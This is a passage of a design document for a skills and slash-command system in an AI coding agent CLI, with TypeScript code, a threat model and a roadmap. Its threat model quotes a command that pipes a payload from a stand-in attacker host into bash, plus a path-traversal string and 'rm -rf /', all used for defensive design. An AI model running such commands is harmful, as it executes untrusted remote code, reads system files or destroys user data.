            finalPrompt += `\n\n<project_context>\nThe user has provided the following project-specific instructions and guidelines from their .december workspace:\n`
            for (const rule of rules) {
                finalPrompt += `<project_instructions path="${rule.path}">\n${rule.content}\n</project_instructions>\n`
            }
            finalPrompt += `</project_context>`
        }

        // Dynamic environment placed strictly at the end
        finalPrompt += `\n\nCurrent date: ${new Date().toISOString().split('T')[0]}\nCurrent working directory: ${config.workspaceDir}`

        this.agent = new Agent({
            ...config,
            systemPrompt: finalPrompt,
        })
    }

    public getDiscoveredSkills(): DiscoveredSkill[] {
        return this.skills
    }
}
```

### 7.6 Updating `packages/shared/src/utils/token-decomposition.ts`

```typescript
// Updated skill extraction matching the <skills> catalog block
export function decomposeSystemPrompt(
    systemPrompt?: string | null
): RequestLogSystemPromptDecomposition {
    // ... rules extraction ...

    // Extract skills catalog from <skills>...</skills>
    let skillsText = ''
    const skills: string[] = []
    const skillsBlockRegex = /<skills>([\s\S]*?)<\/skills>/i
    const skillsMatch = trimmedPrompt.match(skillsBlockRegex)

    if (skillsMatch && skillsMatch[1]) {
        skillsText = skillsMatch[0].trim()
        const catalogRegex = /^-\s+([a-z0-9-_]+)\s+\(([^)]+)\):/gm
        let m: RegExpExecArray | null
        while ((m = catalogRegex.exec(skillsMatch[1])) !== null) {
            skills.push(m[1])
        }
    } else {
        // Fallback backward-compatible check for legacy Available Skills:\n
        const legacyRegex =
            /Available Skills:\n([\s\S]*?)(?=(?:\n\n<project_context>|\n\nCurrent date:|$))/i
        const legacyMatch = trimmedPrompt.match(legacyRegex)
        if (legacyMatch && legacyMatch[1]) {
            skillsText = legacyMatch[1].trim()
            skills.push(
                ...skillsText
                    .split('\n')
                    .map((s) => s.trim())
                    .filter(Boolean)
            )
        }
    }

    const skillsTokens = estimateTextTokens(skillsText)
    // ... returns structured breakdown ...
}
```

---

## 8. Interactive Session & Slash Command Interplay

A major ergonomics win is seamless interoperability between skills and user-initiated slash commands.

```
                               INTERACTIVE USER INPUT FLOW

   User inputs: "/docker-deploy staging --clean"
                      |
                      v
   +-------------------------------------------------------------------------+
   | apps/cli/src/hooks/use-agent-session.ts                                 |
   | 1. Check custom commands (.december/commands.json)                      |
   |    ↳ If matched: expand template args                                   |
   |                                                                         |
   | 2. Check installed skills (SkillDiscoveryEngine)                        |
   |    ↳ If matched: "/docker-deploy" -> DiscoveredSkill('docker-deploy')   |
   +------------------+------------------------------------------------------+
                      |
                      v
   +-------------------------------------------------------------------------+
   | Skill Expansion & Auto-Injection                                        |
   | - Read SKILL.md body directly                                           |
   | - Synthesize steering message:                                          |
   |   "User invoked /docker-deploy with arguments: 'staging --clean'.       |
   |    Follow the procedure defined below:                                  |
   |    <skill name='docker-deploy'>                                         |
   |    [SKILL.md Contents]                                                  |
   |    </skill>"                                                            |
   +------------------+------------------------------------------------------+
                      |
                      v
   +-------------------------------------------------------------------------+
   | Submit to Agent Session Execution Loop                                  |
   +-------------------------------------------------------------------------+
```

### Implementation in `use-agent-session.ts`:

```typescript
// In apps/cli/src/hooks/use-agent-session.ts:
if (text.trim().startsWith('/')) {
    const rawTrimmed = text.trim()
    const [firstToken, ...restArgs] = rawTrimmed.split(/\s+/)
    const cmdName = firstToken.slice(1).toLowerCase()

    // 1. Check customCommands (commands.json)
    const customCommands = loadCustomCommands()
    const matchedCmd = customCommands.find((c) => c.name.toLowerCase() === cmdName)
    if (matchedCmd) {
        text = interpolateCommandPrompt(matchedCmd.prompt, restArgs)
    } else {
        // 2. Check installed skills
        const skills = skillDiscoveryEngine.discoverAllSkills()
        const matchedSkill = skills.find((s) => s.name === cmdName)
        if (matchedSkill) {
            const { body } = parseSkillFile(matchedSkill.entryFilePath)
            const argsString = restArgs.join(' ').trim()
            text = `[Skill Invocation: /${matchedSkill.name}${argsString ? ` ${argsString}` : ''}]\n\nPlease follow the procedures from skill '${matchedSkill.name}':\n\n${body}`
        }
    }
}
```

---

## 9. Security, Execution Sandboxing & Safety Guardrails

Because community skills can bundle executable shell scripts in `scripts/*.sh` or python scripts in `scripts/*.py`, December must enforce rigorous security boundaries:

### 9.1 The Threat Model

1. **Malicious Tool Execution**: A community skill download that contains a script executing `curl -s https://evil.com/payload | bash` or exfiltrating environment variables.
2. **Directory Traversal**: A skill attempting to reference `../../../../etc/passwd` in its `references/` or `scripts/` directory.
3. **Implicit Execution Without Human Oversight**: The model silently running arbitrary helper scripts from a newly installed skill without user awareness.

### 9.2 Defense-in-Depth Architecture

```
+---------------------------------------------------------------------------------------------------+
| LAYER 1: INSTALLATION STATIC SANITIZATION                                                         |
| - Verify all files reside strictly inside skill directory root (no symlinks escaping root).       |
| - AST scan shell scripts for destructive commands (`rm -rf /`, raw disk formatting).              |
+--------------------------------------------------+------------------------------------------------+
                                                   |
                                                   v
+--------------------------------------------------+------------------------------------------------+
| LAYER 2: BOUNDED PATH VERIFICATION (RUNTIME)                                                      |
| - `read_file` and execution tools verify paths using `path.resolve(workspaceDir)`.                |
| - Scripts outside workspace or global config roots are strictly rejected.                         |
+--------------------------------------------------+------------------------------------------------+
                                                   |
                                                   v
+--------------------------------------------------+------------------------------------------------+
| LAYER 3: INTERACTIVE TOOL APPROVALS & HEADLESS FLAGS                                              |
| - In Interactive TUI: Any bash execution targeting a skill `scripts/` folder triggers an          |
|   explicit permission prompt showing the full script content and arguments.                       |
| - In Headless Mode: Execution rejected unless `--yes` / `-y` flag is explicitly supplied.         |
+---------------------------------------------------------------------------------------------------+
```

---

## 10. Implementation Roadmap & Migration Strategy

The migration from legacy `.december/skills.md` to the modern extensible skills architecture is planned across 4 discrete phases:

### Phase 1: Core Shared Package (`packages/shared`)

- [ ] Implement `packages/shared/src/skills/types.ts`.
- [ ] Implement `packages/shared/src/skills/parser.ts` (YAML frontmatter parser & validator).
- [ ] Implement `packages/shared/src/skills/discovery.ts` (Workspace, `.agents/`, global, and builtin scanner).
- [ ] Implement `packages/shared/src/skills/formatter.ts` (`<skills>` prompt catalog generator).
- [ ] Update `packages/shared/src/utils/token-decomposition.ts` to cleanly parse and calculate catalog tokens.
- [ ] Add comprehensive unit tests in `packages/shared/tests/skills-discovery.test.ts`.

### Phase 2: Agent Harness Integration (`packages/agent`)

- [ ] Replace rudimentary `discoverSkills()` in `agent-harness.ts` with `SkillDiscoveryEngine`.
- [ ] Ensure backward compatibility: if a legacy `.december/skills.md` exists without frontmatter, wrap it automatically as a legacy synthesized skill (`legacy-workspace-skills`).
- [ ] Verify static prompt ordering to protect KV prompt cache hit rates.

### Phase 3: CLI Subcommand & Package Downloader (`apps/cli`)

- [ ] Add `'skill'` and `'skills'` to `knownCommands` in `apps/cli/src/args.ts`.
- [ ] Implement `handleSkillCommand` in `apps/cli/src/commands/skill.ts`:
    - `skill list`: tabular view of all skills, origins, and descriptions.
    - `skill add <source>`: sparse git checkout downloader with `--global` support.
    - `skill remove <name>`: clean deletion from `.december/skills` or `.agents/skills`.
    - `skill info <name>`: formatted metadata and frontmatter view.
    - `skill create <name>`: template scaffolding.
- [ ] Wire command into CLI entrypoint (`apps/cli/src/index.ts`).

### Phase 4: Interactive TUI & Slash Command Expansion

- [ ] Update `apps/cli/src/hooks/use-agent-session.ts` to autocomplete and expand installed skills as slash commands.
- [ ] Display installed skills count and status in TUI footer or status bar.
- [ ] Verify end-to-end compatibility by importing existing Google Antigravity skills (e.g., `ponytail`, `agy-customizations`).

---

## 11. Primary References & Citations

1. **Google Antigravity Customization System Specification**:
    - Manifest & Rules Standard: `/home/chaitanya/.gemini/antigravity-cli/builtin/skills/agy-customizations/SKILL.md`
    - Workspace Skills Runbook Specification: `/home/chaitanya/.gemini/antigravity-cli/builtin/skills/agy-customizations/docs/skills.md`
    - Plugins & Extension Bundles: `/home/chaitanya/.gemini/antigravity-cli/builtin/skills/agy-customizations/docs/plugins.md`
    - JSON Manifest Declarations (`skills.json`): `/home/chaitanya/.gemini/antigravity-cli/builtin/skills/agy-customizations/docs/json_configs.md`
    - Real-World Production Skill Implementation: `/home/chaitanya/.gemini/config/plugins/ponytail/skills/ponytail/SKILL.md`
2. **December Agent Core**:
    - Harness Implementation: `packages/agent/src/harness/agent-harness.ts`
    - Token Context Decomposition: `packages/shared/src/utils/token-decomposition.ts`
    - Custom Commands Runner: `packages/shared/src/custom-commands.ts`
    - CLI Entrypoint & Argument Dispatcher: `apps/cli/src/args.ts`, `apps/cli/src/index.ts`, `apps/cli/src/commands.ts`
    - Interactive Session Engine: `apps/cli/src/hooks/use-agent-session.ts`
    - Existing Tool Implementations: `packages/tools/src/read.ts`, `packages/tools/src/index.ts`
3. **Academic & Industry Agent Literature**:
    - Voyager: An Open-Ended Embodied Agent with Large Language Models (Wang et al., 2023) — _Pioneering lifelong skill libraries and iterative program synthesis_.
    - LATM: Large Language Models as Tool Makers (Cai et al., 2023) — _Separation of tool maker and tool user roles_.
    - Reflexion: Language Agents with Verbal Reinforcement Learning (Shinn et al., 2023).
    - Anthropic Prompt Engineering & Prompt Caching Guide (Anthropic, 2024–2026) — _KV Cache boundary preservation protocols_.
